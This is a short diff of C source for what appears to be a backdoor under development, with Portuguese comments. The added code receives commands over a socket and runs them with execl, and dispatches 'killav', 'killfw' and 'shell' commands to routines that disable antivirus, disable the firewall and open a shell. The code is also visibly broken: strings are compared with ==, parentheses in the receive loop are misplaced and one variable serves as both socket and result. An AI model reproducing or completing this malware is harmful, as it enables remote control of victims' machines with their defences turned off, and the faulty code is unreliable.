@@ -212,23 +212,26 @@ terraquian date: 4/10/2017 - 04:57 AM - *** in desenvolpment.
      if (setsockopt(x, SOL_SOCKET, SO_REUSEADDR, &(int){ 1 }, sizeof(int)) < 0)
      perror("setsockopt(SO_REUSEADDR)failed");
 
-     char buf[1024];
+      char buf[bytes];
+    // FILE *cmd;
 
-        x = recv(x, buf, sizeof buf,  0 );
-        if(x == false)
+        //for(;;)
+        while((x=recv(x, buf, sizeof buf,  0) > 0)) {
+        //if(x == false)
+        // buf = "";
+         x = execl(buf,"r",0);
+        //send(x, buf, strlen(buf), 0);
+         //printf("%s",buf); ; to debug stuffs, all right for here. /
 
-        return;
-        while(1);
-
-             if(x == "killav")
-             {
+            if(buf == "killav")
+            {
                 kill_antivirus();
             }
-            else if(x == "killfw")
+            else if(buf == "killfw")
             {
                 kill_firewall();
             }
-            else if(x == "shell")
+            else if(buf == "shell")
             {
                     shell();
             }
@@ -237,6 +240,7 @@ terraquian date: 4/10/2017 - 04:57 AM - *** in desenvolpment.
                 return;
             }
 
+   }
 
 
   /*função para o programa rodar em background, como uma daemon
